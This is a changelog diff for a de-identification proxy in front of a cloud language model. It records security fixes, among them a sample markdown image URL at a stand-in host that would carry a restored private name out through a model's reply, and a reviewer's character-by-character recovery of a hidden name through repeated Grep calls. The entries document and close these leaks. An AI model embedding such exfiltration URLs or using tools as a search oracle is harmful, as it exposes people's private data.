@@ -69,6 +69,14 @@ than 0.3.0. Every other condition passed, including sensitive recall 1.000 and c
   each call was a yes/no oracle over the raw contents and names of every file under `[hooks] roots`: a reviewer
   recovered a de-identified name character by character in 94 Grep calls. Their PostToolUse output profiles stay, so
   any output that still arrives is re-scanned. `allowed_tools` still accepts both names; they are denied regardless.
+- **SEC-03 / R-01, placeholders inside URLs are not restored.** Restoration put the real value back wherever the cloud
+  reply wrote a placeholder, so a reply such as `![status](https://collector.example/p.png?n=⟦P:...⟧)` came back with
+  the real name in the image address and a clean report. A client that rendered the reply then sent the name to that
+  host. Now a placeholder inside a URL stays as the placeholder: in a scheme run (`https://...`, `mailto:`, `data:`,
+  ...), a markdown link or image target, or an HTML `src`/`href`/`action` value. The same applies to each tool-argument
+  string. The restoration report counts these as `withheld_in_url`, and the router returns that count in its `themis`
+  object next to `unknown_tokens`. A placeholder next to a URL is restored as before. Commands, code and other non-URL
+  contexts are still restored as written (SECURITY "Known limits").
 
 ## 0.3.4 (30/10/2026)
 
